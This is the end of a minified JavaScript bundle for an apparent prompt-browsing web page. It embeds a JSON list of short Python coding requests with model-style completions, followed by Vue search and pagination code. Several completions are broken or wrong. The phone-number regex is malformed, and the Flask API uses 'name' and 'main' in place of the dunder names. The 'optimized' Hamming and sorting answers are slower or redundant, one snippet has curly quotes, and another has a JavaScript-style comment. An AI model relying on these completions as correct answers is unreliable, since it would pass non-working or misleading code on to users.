[hello, hell, world, word, hello_world]","completion":"filtered_strings = [string for string in strings if re.match(r\\"^hello.*world\\", string)] # filtered_strings = [\\"hello_world\\"]"},{"prompt":"Write a Python program to replace all the vowels in the given string with '_'. String: Python is a very interesting language","completion":"def replace_vowels(string): vowels = [\\"a\\", \\"e\\", \\"i\\", \\"o\\", \\"u\\"] res = [] for letter in string.lower(): if letter in vowels: res.append('_') else: res.append(letter) return ''.join(res)"},{"prompt":"Generate a Python code snippet to find the minimum value of a list of integers.","completion":"def find_min(list): min_value = list[0] for value in list: if value < min_value: min_value = value return min_value"},{"prompt":"Create a Python program that takes a sentence as input and performs sentiment analysis. The program should output either 'negative' or 'positive'. The food was really bad.","completion":"import nltk sentence = input('Enter a sentence: ') tokens = nltk.word_tokenize(sentence) from nltk.sentiment.vader import SentimentIntensityAnalyzer sid = SentimentIntensityAnalyzer() score_dict = sid.polarity_scores(sentence) score = score_dict['compound'] if score >= 0.05: print('positive') elif score <= -0.05: print('negative') else: print('neutral')"},{"prompt":"Can you define a class in Python which has 3 variables, name (string), age (int) and grade (char).","completion":"class Student: def __init__(self, name, age, grade): self.name = name self.age = age self.grade = grade"},{"prompt":"Generate an algorithm in Python that merges two unsorted linked lists.","completion":"class Node: def __init__(self, data): self.data = data self.next = None def merge(head1, head2): # Base cases if head1 is None: return head2 if head2 is None: return head1 mergedHead = None if head1.data <= head2.data: mergedHead = head1 mergedHead.next = merge(head1.next, head2) else: mergedHead = head2 mergedHead.next = merge(head1, head2.next) return mergedHead"},{"prompt":"Develop a Python script to print the first 10 squares of natural numbers.","completion":"for i in range(1, 11): print(i**2)"},{"prompt":"Optimize this Python code using the tips from this website https://www.dataquest.io/blog/pythonperformancetips/. # code to calculate Hamming distance between two strings def calculate_hamming(word1, word2): distance = 0 for char1, char2 in zip(word1, word2): if char1 != char2: distance += 1 return distance","completion":"def calculate_hamming(word1, word2): distance = 0 length = len(word1) if len(word2) < length: length = len(word2) #Use fast C-style loop to iterate over strings i = 0 while i < length: if word1[i] != word2[i]: distance += 1 i += 1 #count remaining chars if len(word1) != len(word2): distance += abs(len(word1)-len(word2)) return distance"},{"prompt":"Create a python function to classify a given dataset based on the numeric value of a given feature. Income<=50, Risk Level=Low","completion":"def classify_data(feature, value, outcome): if feature == \\"Income\\" and float(value) <= 50: return outcome else: return \\"No Classification\\""},{"prompt":"Create a Python program that takes a given list and returns a new list without any duplicates. [1, 2, 2, 3, 4, 5, 5, 6]","completion":"def remove_duplicates(lst): new_list = [] for i in lst: if i not in new_list: new_list.append(i) return new_list"},{"prompt":"Write a machine learning algorithm in Python for predicting the stock prices of some company","completion":"import pandas as pd from sklearn.linear_model import LinearRegression from sklearn.model_selection import train_test_split # Read historical stock data data = pd.read_csv(‘data.csv’) # Split the data into training and test sets X_train, X_test, y_train, y_test = train_test_split(data.drop(‘target’, axis=1), data[‘target’], test_size=0.2, random_state=2) # Create and fit the model model = LinearRegression() model.fit(X_train, y_train) # Output the prediction y_pred = model.predict(X_test)"},{"prompt":"Write a Python program that encodes an input string with a given shift value.","completion":"def encode_string(input_str, shift): output_str = \\"\\" for ch in input_str: if ch != \\" \\": output_str += chr(ord(ch) + shift) else: output_str += \\" \\" return output_str # Example print(encode_string(\\"hello\\", 5)) # Prints mjqqt"},{"prompt":"Create an object in Python that stores a string of text.","completion":"my_string = \\"This is a string of text\\" my_object = { \\"string\\": my_string }"},{"prompt":"Write Python code to push a list of numbers in the range of 1 to 10 into a queue.","completion":"# Create a queue queue = [] # Push number one to ten for number in range(1, 11): # Pushing each number into the queue queue.append(number) print(queue)"},{"prompt":"Create a Python Pandas program to generate a report summarizing the total sales for each customer. customer_df = [ {'customer_id': '123', 'sales': 100}, {'customer_id': '456', 'sales': 200}, {'customer_id': '789', 'sales': 400} ]","completion":"import pandas as pd # Create dataframe df = pd.DataFrame(customer_df) # Group by customer and sum up sales report = df.groupby(['customer_id'])['sales'].sum() print(report)"},{"prompt":"Write a python code snippet to reverse each word of the given sentence. sentence = 'Hello world'","completion":"def reverse_string(string): words = string.split() reversed_string = [word[::-1] for word in words] return ' '.join(reversed_string) reverse_string(sentence) //Returns 'olleH dlrow'"},{"prompt":"Design and implement a REST API in Python for managing a ToDo list. This API should support the standard CRUD actions (Create, Read, Update, Delete). Not applicable","completion":"from flask import Flask, request, jsonify import sqlite3 app = Flask(name) # Connect to SQLite database connection = sqlite3.connect('tasks.db') cursor = connection.cursor() # Create '/tasks' route for the API @app.route('/tasks', methods=['GET', 'POST', 'PUT', 'DELETE']) def tasks(): # Get all tasks if request.method == 'GET': tasks = cursor.execute('SELECT * FROM tasks').fetchall() tasks = [{'id': task[0], 'description': task[1]} for task in tasks] return jsonify(tasks) # Create a task elif request.method == 'POST': description = request.json['description'] cursor.execute('INSERT INTO tasks (description) VALUES (?)', (description,)) connection.commit() return jsonify({'message': 'Task created'}) # Update a task elif request.method == 'PUT': description = request.json['description'] task_id = request.json['id'] cursor.execute('UPDATE tasks SET description = ? WHERE id = ?', (description, task_id)) connection.commit() return jsonify({'message': 'Task updated'}) # Delete a task elif request.method == 'DELETE': task_id = request.json['id'] cursor.execute('DELETE FROM tasks WHERE id = ?', (task_id,)) connection.commit() return jsonify({'message': 'Task deleted'}) if name == 'main': app.run(debug=True)"},{"prompt":"Convert this Python list to a JSON object. ['Apple', 'Banana', 'Coconut']","completion":"import json inputList = ['Apple', 'Banana', 'Coconut'] jsonObj = json.dumps(inputList) print(jsonObj)"},{"prompt":"Create a program in Python to find the edit distance of two given strings.","completion":"def edit_distance(str1, str2): # Initialize the DP matrix m = len(str1) + 1 n = len(str2) + 1 dp_matrix = [[0 for x in range(n)] for x in range(m)] for i in range(m): for j in range(n): if i == 0: dp_matrix[i][j] = j # Min. operations = j elif j == 0: dp_matrix[i][j] = i # Min. operations = i # If characters match elif str1[i-1] == str2[j-1]: dp_matrix[i][j] = dp_matrix[i-1][j-1] # If characters don't match else: dp_matrix[i][j] = 1 + min(dp_matrix[i][j-1], # Insert dp_matrix[i-1][j], # Remove dp_matrix[i-1][j-1]) # Replace return dp_matrix[m-1][n-1]"},{"prompt":"Optimize the following python code to speed up execution time: arr = [2, 5, 3, 1] for i in range(len(arr)): for j in range(i + 1, len(arr)): if arr[i] > arr[j]: arr[i], arr[j] = arr[j], arr[i] [2, 5, 3, 1]","completion":"arr = [2, 5, 3, 1] # using Python's built in \`sorted\` function arr = sorted(arr) # using the Bubble Sort algorithm for i in range(len(arr) - 1): for j in range(len(arr) - 1 - i): if arr[j] > arr[j + 1]: arr[j], arr[j + 1] = arr[j + 1], arr[j]"},{"prompt":"Create a module in Python for validating a phone number. phone number = +18008675309","completion":"import re phone_number = \\"+1-800-867-5309\\" phone_pattern = re.compile(r'^+[1-9]d{1,2}-d{3}-d{3}-d{4}') def validate_phone_number(phone_number): return phone_pattern.search(phone_number) valid = validate_phone_number(phone_number) if valid: print(\\"Valid Phone number\\") else: print(\\"Invalid Phone number\\")"},{"prompt":"Create a Machine Learning program in Python to classify a series of handwritten digits Not applicable","completion":"from sklearn.datasets import load_digits from sklearn.model_selection import train_test_split from sklearn.svm import SVC # load the dataset digits = load_digits() # split into training and testing sets X_train, X_test, y_train, y_test = train_test_split(digits.data, digits.target, random_state=0) # build the model model = SVC(gamma='auto') model.fit(X_train, y_train) # evaluate the model print(model.score(X_test, y_test))"},{"prompt":"Generate a list of Python library names available in the Python standard library.","completion":"Built-in Python libraries: 1. ast 2. dis 3. math 4. fractions 5. datetime 6. hashlib 7. itertools 8. json 9. urllib 10. os 11. pickle 12. random 13. re 14. subprocess 15. sys 16. time 17. zlib"},{"prompt":"Create a Python program to find all elements in a list that appear more than once. list=[1, 2, 3, 2, 4, 5, 1, 0]","completion":"def duplicate_elements(lst): seen_elements = set() duplicates = set() for element in lst: if element in seen_elements: duplicates.add(element) else: seen_elements.add(element) return duplicates list = [1, 2, 3, 2, 4, 5, 1, 0] duplicates = duplicate_elements(list) print(duplicates) # {1, 2}"},{"prompt":"Automate a task using a python script to create a git pull request.","completion":"# Import necessary libraries import requests import json # Set authentication credentials username = 'username' password = 'password' token = 'token' # Set request headers headers = { 'Content-Type': 'application/json', 'Authorization': 'token %s' % token } # Set the data for the request data = { 'title': 'My pull request', 'head': 'master', 'base': 'develop', 'body': 'This is the body of my pull request' } # Make the request response = requests.post('https://api.github.com/repos/username/repo/pulls', data=json.dumps(data), auth=(username, password), headers=headers) # Check the response if response.status_code == 201: print('Pull request created!')"},{"prompt":"Create a Python class to represent a 3D vector object","completion":"class Vector3D(object): def __init__(self, x, y, z): self.x = x self.y = y self.z = z def __str__(self): return f\\"Vector3D({self.x}, {self.y}, {self.z})\\" def __add__(self, other): return Vector3D(self.x + other.x, self.y + other.y, self.z + other.z) def __mul__(self, scalar): return Vector3D(self.x * scalar, self.y * scalar, self.z * scalar)"}]`),N={name:"App",components:{PoemCard:I},data(){return{searchQuery:"",visibleCount:4,poemsData:j,isLoading:!1}},computed:{filteredPoems(){const a=this.searchQuery.trim().toLowerCase();return a?this.poemsData.filter(e=>e.prompt&&e.prompt.toLowerCase().includes(a)||e.completion&&e.completion.toLowerCase().includes(a)):this.poemsData},displayedPoems(){return this.searchQuery.trim()?this.filteredPoems:this.filteredPoems.slice(0,this.visibleCount)},hasMorePoems(){return!this.searchQuery.trim()&&this.visibleCount<this.poemsData.length}},methods:{async loadMore(){this.isLoading=!0,await new Promise(a=>setTimeout(a,1e3)),this.visibleCount+=4,this.isLoading=!1}}},A={class:"search-container"},E={class:"card-container"},D={key:0,class:"empty-state"},R=["disabled"],F={key:0},L={key:1};function z(a,e,l,u,i,o){const f=_("PoemCard");return r(),n("section",null,[e[4]||(e[4]=t("div",{class:"top-banner"},[t("div",{class:"top-banner-title"},[t("div",{class:"top-banner-title-text"},"🤔prompts chat🧠")])],-1)),t("div",A,[e[3]||(e[3]=t("span",{class:"search-icon"},"🔍",-1)),g(t("input",{type:"text",class:"search-input","onUpdate:modelValue":e[0]||(e[0]=s=>i.searchQuery=s),placeholder:"Search..."},null,512),[[y,i.searchQuery]]),i.searchQuery?(r(),n("button",{key:0,class:"clear-search",onClick:e[1]||(e[1]=s=>i.searchQuery="")}," ✕ ")):p("",!0)]),t("div",E,[(r(!0),n(b,null,w(o.displayedPoems,(s,h)=>(r(),v(f,{key:h,poem:s},null,8,["poem"]))),128)),o.displayedPoems.length===0?(r(),n("div",D,' No results found for "'+m(i.searchQuery)+'". ',1)):p("",!0)]),o.hasMorePoems?(r(),n("button",{key:0,class:"load-more-button",disabled:i.isLoading,onClick:e[2]||(e[2]=(...s)=>o.loadMore&&o.loadMore(...s))},[i.isLoading?(r(),n("span",L,"Loading...")):(r(),n("span",F,"See more"))],8,R)):p("",!0)])}const O=c(N,[["render",z],["__scopeId","data-v-1f3d9670"]]),G=JSON.parse('{"title":"","description":"","frontmatter":{"page":true},"headers":[],"relativePath":"library/3.md","filePath":"library/3.md"}'),M={name:"library/3.md"},B=Object.assign(M,{setup(a){return(e,l)=>(r(),n("div",null,[x(O)]))}});export{G as __pageData,B as default};
